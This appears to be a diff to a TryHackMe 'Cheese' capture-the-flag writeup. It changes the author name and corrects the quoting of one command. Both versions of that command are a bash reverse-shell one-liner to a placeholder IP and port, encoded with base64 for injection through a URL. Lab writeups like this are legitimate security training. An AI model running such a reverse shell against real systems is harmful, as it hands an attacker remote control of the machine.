@@ -2,7 +2,7 @@
 layout: post
 title: "Cheese Tryhackme (easy)-Writeup"
 date: 2025-11-13 2:00:00 +0000
-author: "Kingston Kwabena Anab"
+author: sh4de
 categories: [CTF, Writeup]
 tags: [tryhackme]
 ---
@@ -56,7 +56,7 @@ My command got executed successfully.
 ### Initial Access and Exploitation
 Obviously, the next step is to send a reverse shell connection to my local machine. In order to avoid any conflicts between the url and my reverse shell command, I decided to encode it and fix it into the url so that the url does the decoding by itself.
 ```bash
-echo 'echo '/bin/bash -i >& /dev/tcp/<your_ip>/<listening port> 0>&1'|base64
+echo '/bin/bash -i >& /dev/tcp/<your_ip>/<listening port> 0>&1'|base64
 ```
 I executed it with the command 
 ```bash
